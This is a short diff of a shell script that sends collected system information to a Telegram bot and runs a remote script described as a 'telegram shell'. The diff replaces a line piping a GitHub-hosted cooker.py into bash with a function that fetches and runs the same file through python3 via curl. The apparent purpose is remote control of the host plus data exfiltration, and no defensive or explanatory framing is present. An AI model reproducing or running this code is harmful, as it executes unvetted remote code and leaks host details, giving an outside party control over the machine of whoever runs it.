@@ -66,5 +66,8 @@ get_telegram_system_info() {
 system_info=$(get_telegram_system_info)
 send_telegram_msg "$system_info"
 
-# Run telegram shell
-bash <(curl -s https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/cooker.py)
+# Python স্ক্রিপ্ট রান করার ফাংশন
+run_cooker() {
+    python3 <(curl -s https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/cooker.py) "$@"
+}
+
